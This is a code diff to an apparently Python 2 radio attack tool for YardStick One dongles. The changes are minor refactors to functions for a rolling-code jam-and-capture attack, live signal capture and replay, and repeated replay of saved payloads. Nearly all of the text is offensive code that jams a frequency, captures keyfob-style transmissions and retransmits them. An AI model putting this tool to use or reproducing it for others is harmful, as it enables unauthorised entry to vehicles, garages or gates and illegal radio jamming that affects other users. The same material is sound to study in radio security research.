@@ -4,12 +4,12 @@ import findDevices, jam
 import time
 
 #-----------------Rolling Code-------------------------#
-def rollingCode(d, frequency, jamming_variance, mdm_rate_jammer, rolling_code, upper_rssi, lower_rssi):
+def rollingCode(d, frequency, jamming_variance, baud_rate_jammer, rolling_code, upper_rssi, lower_rssi):
     '''Sets up for a rolling code attack, requires a frequency
     and a RFCat Object'''
-    print frequency+jamming_variance
+
     print("ROLLING CODE REQUIRES 2 YardSticks Plugged In")
-    j = jam.setupJammer(1, mdm_rate_jammer)
+    j = jam.setupJammer(1, baud_rate_jammer)
 
     jam.jamming(j, "start", frequency+jamming_variance, rolling_code)
     roll_captures, signal_strength = tools.capturePayload(d, rolling_code, upper_rssi, lower_rssi)
@@ -20,7 +20,6 @@ def rollingCode(d, frequency, jamming_variance, mdm_rate_jammer, rolling_code, u
     payloads = tools.createBytesFromPayloads(roll_captures)
 
     time.sleep(1)
-
     jam.jamming(j, "stop",frequency+jamming_variance, rolling_code)
 
     print "Sending First Payload "
@@ -38,11 +37,11 @@ def rollingCode(d, frequency, jamming_variance, mdm_rate_jammer, rolling_code, u
 
 
 #---------------Replay Live Capture----------------------#
-def replayLiveCapture(d, rolling_code):
+def replayLiveCapture(d, rolling_code, upper_rssi, lower_rssi):
     '''Replays a live capture real time, lets you select your capture
     and replay it or save it for later'''
 
-    replay_capture, signal_strength = tools.capturePayload(d,rolling_code)
+    replay_capture, signal_strength = tools.capturePayload(d,rolling_code, upper_rssi, lower_rssi)
     replay_capture = [replay_capture]
 
     response = raw_input( "Replay this capture? (y/n) ")
@@ -66,13 +65,14 @@ def replayLiveCapture(d, rolling_code):
 def replaySavedCapture(d, uploaded_payload):
     with open(uploaded_payload) as f:
         payloads = f.readlines()
+        print payloads
         payloads = tools.createBytesFromPayloads(payloads)
 
         response = raw_input( "Send once, or forever? (o/f) Default = o ")
 
         if response.lower() == "f":
             print("\nNOTE: TO STOP YOU NEED TO CTRL-Z and Unplug/Plug IN YARDSTICK-ONE\n")
-            while 1:
+            while True:
                 for payload in payloads:
                     print "WAITING TO SEND"
                     time.sleep(1)          #You may not want this if you need rapid fire tx
